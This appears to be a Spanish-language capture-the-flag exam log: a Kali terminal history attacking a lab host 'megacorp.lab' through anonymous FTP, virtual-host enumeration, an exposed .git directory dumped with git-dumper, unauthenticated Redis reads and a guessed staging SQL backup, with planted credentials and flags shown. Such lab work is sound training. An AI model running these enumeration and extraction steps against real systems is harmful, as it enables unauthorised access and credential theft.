# Historial Completo de la Terminal (Evidencias de Auditoría)

Este archivo contiene el volcado íntegro de la sesión de Kali Linux durante la explotación de la infraestructura de MegaCorp (`3.88.28.22`).

---

## 📍 Índice de Flags

- [FLAG{redis_unauthenticated_access}](#flag-redis_unauthenticated_access) — V-01
- [FLAG{git_source_disclosure}](#flag-git_source_disclosure) — V-02
- [FLAG{exposed_monitoring_8080}](#flag-exposed_monitoring_8080) — V-03
- [FLAG{staging_sql_backup}](#flag-staging_sql_backup) — Backup SQL

---

## Fase 1: Reconocimiento Inicial

```text


┌──(kali㉿kali)-[~]
└─$ mkdir ~/examen-megacorp
cd ~/examen-megacorp
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ nmap -p 21,22,80,443,8080,3306 -sV -sC 3.88.28.22 -oN nmap_inicial.txt  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 10:32 -0400
Nmap scan report for ec2-3-88-28-22.compute-1.amazonaws.com (3.88.28.22)
Host is up (0.047s latency).

PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: socket EOF
22/tcp   filtered ssh
80/tcp   open     http     Caddy httpd
|_http-server-header: Caddy
|_http-title: It works
443/tcp  open     ssl/http Caddy httpd
|_http-server-header: Caddy
|_http-title: It works
| ssl-cert: Subject: commonName=megacorp.lab/organizationName=MegaCorp Internal
| Subject Alternative Name: DNS:megacorp.lab, DNS:www.megacorp.lab, DNS:dev.megacorp.lab, DNS:admin.megacorp.lab, DNS:api.megacorp.lab, DNS:internal.megacorp.lab, DNS:staging.megacorp.lab, DNS:vpn[...]
| Not valid before: 2026-06-25T16:10:53
|_Not valid after:  2027-06-25T16:10:53
|_ssl-date: TLS randomness does not represent time
3306/tcp filtered mysql
8080/tcp open     http     Caddy httpd
|_http-title: MegaCorp Monitoring
|_http-server-header: Caddy
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.91 seconds
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ sudo sh -c "echo '3.88.28.22 megacorp.lab www.megacorp.lab dev.megacorp.lab admin.megacorp.lab api.megacorp.lab internal.megacorp.lab staging.megacorp.lab vpn.megacorp.lab' >> /etc/hosts"
[sudo] password for kali:
```

## Fase 2: Enumeración FTP y Acceso Anónimo

```text
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ ftp 3.88.28.22
çConnected to 3.88.28.22.
220 (vsFTPd 3.0.3)
Name (3.88.28.22:kali): kali 
530 This FTP server is anonymous only.
ftp: Login failed
ftp> bye
221 Goodbye.
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ ftp 3.88.28.22
Connected to 3.88.28.22.
220 (vsFTPd 3.0.3)
Name (3.88.28.22:kali): anonymous            
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.

425 Failed to establish connection.
ftp> exit
221 Goodbye.
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ wget -r ftp://anonymous:anonymous@3.88.28.22/
--2026-07-02 10:37:24--  ftp://anonymous:*password*@3.88.28.22/
           => '3.88.28.22/.listing'
Connecting to 3.88.28.22:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

3.88.28.22/.listing     [ <=>             ]     254  --.-KB/s    in 0s      

2026-07-02 10:37:25 (52.1 MB/s) - '3.88.28.22/.listing' saved [254]

Removed '3.88.28.22/.listing'.
--2026-07-02 10:37:25--  ftp://anonymous:*password*@3.88.28.22/flag.txt
           => '3.88.28.22/flag.txt'
==> CWD not required.
==> PASV ... done.    ==> RETR flag.txt ... done.
Length: 138

3.88.28.22/flag.txt 100%[================>]     138  --.-KB/s    in 0s      

2026-07-02 10:37:25 (21.1 MB/s) - '3.88.28.22/flag.txt' saved [138]

--2026-07-02 10:37:25--  ftp://anonymous:*password*@3.88.28.22/welcome.txt
           => '3.88.28.22/welcome.txt'
==> CWD not required.
==> PASV ... done.    ==> RETR welcome.txt ... done.
Length: 431

3.88.28.22/welcome. 100%[================>]     431  --.-KB/s    in 0.001s  

2026-07-02 10:37:26 (674 KB/s) - '3.88.28.22/welcome.txt' saved [431]

FINISHED --2026-07-02 10:37:26--
Total wall clock time: 1.9s
Downloaded: 2 files, 569 in 0.001s (874 KB/s)
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ cat 3.88.28.22/flag.txt
FLAG{ftp_anonymous_access}

You found anonymous FTP. Next: enumerate virtual hosts on the web server
(ffuf -H "Host: FUZZ.megacorp.lab").
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ cat 3.88.28.22/welcome.txt
MegaCorp FTP — anonymous mirror
================================

This server hosts public release artifacts for megacorp.lab.

NOTE TO OPS: stop leaving internal notes here. Anonymous login is enabled and
anyone can read this. The web team also keeps spinning up extra virtual hosts
(dev, staging, admin...) on the main web server — remember to enumerate them by
Host header, they don't all have public DNS yet.

See flag.txt
```

## Fase 3: Enumeración de Virtual Hosts

```text
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ for sub in megacorp.lab www.megacorp.lab dev.megacorp.lab admin.megacorp.lab api.megacorp.lab internal.megacorp.lab staging.megacorp.lab vpn.megacorp.lab; do echo -e "\n=== $sub ==="; cur[...]

=== megacorp.lab ===
HTTP/2 200 

=== www.megacorp.lab ===
HTTP/2 200 

=== dev.megacorp.lab ===
HTTP/2 200 

=== admin.megacorp.lab ===
HTTP/2 401 

=== api.megacorp.lab ===
HTTP/2 200 

=== internal.megacorp.lab ===
HTTP/2 200 

=== staging.megacorp.lab ===
HTTP/2 200 

=== vpn.megacorp.lab ===
HTTP/2 200
```

## Fase 4: Descubrimiento de Puertos Alternativos

```text
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ curl -s -k http://megacorp.lab:8080/ | grep -i title
<html lang="en"><head><meta charset="utf-8"><title>MegaCorp Monitoring</title></head>
```

### <a id="flag-exposed_monitoring_8080">FLAG{exposed_monitoring_8080}</a>

```text
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ echo -e "\n=== DEV ===" && curl -s -k https://dev.megacorp.lab
echo -e "\n=== STAGING ===" && curl -s -k https://staging.megacorp.lab
echo -e "\n=== MONITORING 8080 ===" && curl -s http://megacorp.lab:8080

=== DEV ===
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>dev.megacorp.lab</title></head>
<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
  <h1>Dev environment</h1>
  <p>Internal development build. Do not deploy to production.</p>
  <p>Directory listing is on — handy for us, handy for you.</p>
</body></html>

=== STAGING ===
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>staging.megacorp.lab</title></head>
<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
  <h1>Staging</h1>
  <p>Pre-production mirror of the billing app. Directory listing is on.</p>
  <p>Someone dumped a database backup in the web root again.</p>
</body></html>

=== MONITORING 8080 ===
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>MegaCorp Monitoring</title></head>
<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
  <h1>MegaCorp Monitoring</h1>
  <p>Internal monitoring dashboard, exposed on a non-standard port (8080) with
     no authentication.</p>
  <p><strong>FLAG{exposed_monitoring_8080}</strong></p>
  <ul>
    <li>Directory listing is enabled — see <a href="/status.txt">status.txt</a></li>
  </ul>
</body></html>
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ curl -s http://megacorp.lab:8080/status.txt
service: billing-worker   state: running   uptime: 19d
service: redis-cache      state: running   port: 6379 (no auth!)
service: legacy-billing   state: running   port: 8000 (source repo exposed)
host: ip-10-20-1-x   load: 0.14 0.09 0.05
```

## Fase 5: Explotación del Repositorio Git Expuesto (Puerto 8000)

```text
                                                                              
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ curl -s http://3.88.28.22:8000/  
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Legacy Billing</title></head>
<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
  <h1>Legacy Billing App</h1>
  <p>Deprecated internal billing tool. Should have been decommissioned in 2019.</p>
  <p>Nothing to see here. (Except the entire source repository — this directory
     was deployed straight from a working git checkout.)</p>
</body></html>
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ curl -s http://3.88.28.22:8000/.git/HEAD
ref: refs/heads/master
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ sudo apt update && sudo apt install -y git-dumper
Get:1 http://kali.download/kali kali-rolling InRelease [34.0 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [21.3 MB]
Get:3 http://kali.download/kali kali-rolling/main amd64 Contents (deb) [53.4 MB]
Get:4 http://kali.download/kali kali-rolling/contrib amd64 Packages [103 kB]
Get:5 http://kali.download/kali kali-rolling/contrib amd64 Contents (deb) [188 kB]
Get:6 http://kali.download/kali kali-rolling/non-free amd64 Packages [169 kB]
Get:7 http://kali.download/kali kali-rolling/non-free-free amd64 Packages [15.4 kB]
Get:8 http://kali.download/kali kali-rolling/non-free-firmware amd64 Packages [15.4 kB]
Get:9 http://kali.download/kali kali-rolling/non-free-firmware amd64 Contents (deb) [40.1 kB]
Fetched 76.2 MB in 11s (6,925 kB/s)                                                               
1635 packages can be upgraded. Run 'apt list --upgradable' to see them.
Error: Unable to locate package git-dumper
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ pipx install git-dumper  
  installed package git-dumper 1.0.9, installed using Python 3.13.12
  These apps are now globally available
    - git-dumper
done! ✨ 🌟 ✨
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ git-dumper http://3.88.28.22:8000/.git/ repo_legacy
[-] Testing http://3.88.28.22:8000/.git/HEAD [200]
[-] Testing http://3.88.28.22:8000/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://3.88.28.22:8000/.gitignore [404]
[-] http://3.88.28.22:8000/.gitignore responded with status code 404
[-] Fetching http://3.88.28.22:8000/.git/ [200]
[-] Fetching http://3.88.28.22:8000/.git/index [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/ [200]
[-] Fetching http://3.88.28.22:8000/.git/logs/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/ [200]
[-] Fetching http://3.88.28.22:8000/.git/refs/ [200]
[-] Fetching http://3.88.28.22:8000/.git/info/ [200]
[-] Fetching http://3.88.28.22:8000/.git/COMMIT_EDITMSG [200]
[-] Fetching http://3.88.28.22:8000/.git/HEAD [200]
[-] Fetching http://3.88.28.22:8000/.git/description [200]
[-] Fetching http://3.88.28.22:8000/.git/config [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/commit-msg.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/post-update.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-commit.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-push.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/pre-receive.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/hooks/update.sample [200]
[-] Fetching http://3.88.28.22:8000/.git/logs/refs/ [200]
[-] Fetching http://3.88.28.22:8000/.git/logs/HEAD [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/a0/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/a8/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/e8/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/04/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/ff/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/info/ [200]
[-] Fetching http://3.88.28.22:8000/.git/refs/heads/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/pack/ [200]
[-] Fetching http://3.88.28.22:8000/.git/info/exclude [200]
[-] Fetching http://3.88.28.22:8000/.git/refs/tags/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/e8/0767bc65d5665b936c90064f011b552f6f006e [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/a8/e111ff05d81148377cc83a24ea56878f6332ea [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/a0/f210b333996e60adc10409d94ca0df97e5937f [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/04/34ffb99a28b01766abb875011e0c1b4e54bed7 [200]
[-] Fetching http://3.88.28.22:8000/.git/logs/refs/heads/ [200]
[-] Fetching http://3.88.28.22:8000/.git/objects/ff/38ec2c273da01da944989777c547fdbd5baeb6 [200]
[-] Fetching http://3.88.28.22:8000/.git/refs/heads/master [200]
[-] Fetching http://3.88.28.22:8000/.git/logs/refs/heads/master [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 3 paths from the index
```

### <a id="flag-git_source_disclosure">FLAG{git_source_disclosure}</a>

```text
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp]
└─$ cd repo_legacy
ls -la
git log --oneline
total 24
drwxrwxr-x 3 kali kali 4096 Jul  2 10:48 .
drwxrwxr-x 4 kali kali 4096 Jul  2 10:48 ..
-rw-rw-r-- 1 kali kali  593 Jul  2 10:48 config.php
drwxrwxr-x 7 kali kali 4096 Jul  2 10:48 .git
-rw-rw-r-- 1 kali kali  440 Jul  2 10:48 index.html
-rw-rw-r-- 1 kali kali  243 Jul  2 10:48 README.md
0434ffb (HEAD -> master) Initial commit - legacy billing app
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ cat config.php
echo -e "\n=== README ===" && cat README.md
<?php
// Legacy billing app configuration.
// Served by a static web server (no PHP interpreter), so this file's SOURCE is
// disclosed directly AND it is recoverable from the exposed .git directory.
// FLAG{git_source_disclosure}

define('DB_HOST', 'db.internal.megacorp.lab');
define('DB_USER', 'billing_legacy');
define('DB_PASS', 'L3gacyB1lling2019');

// Application secrets are cached in Redis (port 6379, no authentication).
// The master flag is stored under the key: secret:flag
define('REDIS_HOST', '127.0.0.1');
define('REDIS_PORT', 6379);
define('SECRET_KEY_NAME', 'secret:flag');

=== README ===
# Legacy Billing App

Internal PHP billing tool. Deprecated.

This repository was committed and deployed to the web root by mistake. Anything
in the git history (credentials, config, removed files) is recoverable with
tools like `git-dumper`.
```

## Fase 6: Explotación de Redis sin Autenticación

### <a id="flag-redis_unauthenticated_access">FLAG{redis_unauthenticated_access}</a>

```text
                                                                                                    
┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 get "secret:flag"
"FLAG{redis_unauthenticated_access}"
```

### Información Adicional desde Redis

```text
┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 keys "*"
1) "cfg:note"
2) "cfg:db_host"
3) "secret:admin_token"
4) "welcome"
5) "cfg:db_user"
6) "secret:flag"

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_host"
"db.internal.megacorp.lab"

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:note"    
"If you can read this without a password, that's the finding."

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_user"
"billing_app"

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ redis-cli -h 3.88.28.22 -p 6379 get "secret:admin_token"
"mc_live_8f2a9d1c7b6e4a3f"
```

## Fase 7: Búsqueda de Backups SQL en Staging

```text
┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ for name in backup.sql db.sql dump.sql megacorp.sql billing.sql billing_legacy.sql staging.sql; do
  echo -n "Probando $name: "
  curl -s -k -o /dev/null -w "%{http_code}\n" https://staging.megacorp.lab/$name
done
Probando backup.sql: 404
Probando db.sql: 404
Probando dump.sql: 404
Probando megacorp.sql: 404
Probando billing.sql: 404
Probando billing_legacy.sql: 404
Probando staging.sql: 404

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ for name in db_backup.sql megacorp_backup.sql billing_backup.sql backup_db.sql schema.sql init.sql; do
  echo -n "Probando $name: "
  curl -s -k -o /dev/null -w "%{http_code}\n" https://staging.megacorp.lab/$name
done
Probando db_backup.sql: 200
Probando megacorp_backup.sql: 404
Probando billing_backup.sql: 404
Probando backup_db.sql: 404
Probando schema.sql: 404
Probando init.sql: 404

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ curl -s -k https://staging.megacorp.lab/db_backup.sql -o db_backup.sql
```

### <a id="flag-staging_sql_backup">FLAG{staging_sql_backup}</a>

```text
┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ cat db_backup.sql | grep -E -i "insert|user|pass|flag"
-- FLAG{staging_sql_backup}
CREATE TABLE users (
  username VARCHAR(64),
  password_hash VARCHAR(255),
-- Note: same DB password as dev (Sup3rDevPassw0rd!). Credential reuse.
INSERT INTO users VALUES
  (1, 'admin', '$2y$10$abcdefghijklmnopqrstuv', 'superuser'),

┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
└─$ cat db_backup.sql                                     
-- MegaCorp billing DB — staging backup (DO NOT COMMIT / DO NOT EXPOSE)
-- FLAG{staging_sql_backup}

CREATE TABLE users (
  id INT PRIMARY KEY,
  username VARCHAR(64),
  password_hash VARCHAR(255),
  role VARCHAR(32)
);

-- Note: same DB password as dev (Sup3rDevPassw0rd!). Credential reuse.
INSERT INTO users VALUES
  (1, 'admin', '$2y$10$abcdefghijklmnopqrstuv', 'superuser'),
  (2, 'billing_app', '$2y$10$0123456789abcdefghijk', 'service');

-- Cache: secrets are kept in the unauthenticated Redis node on port 6379
-- under the key prefix "secret:". Go look.
```

---

**Fin del historial de auditoría**
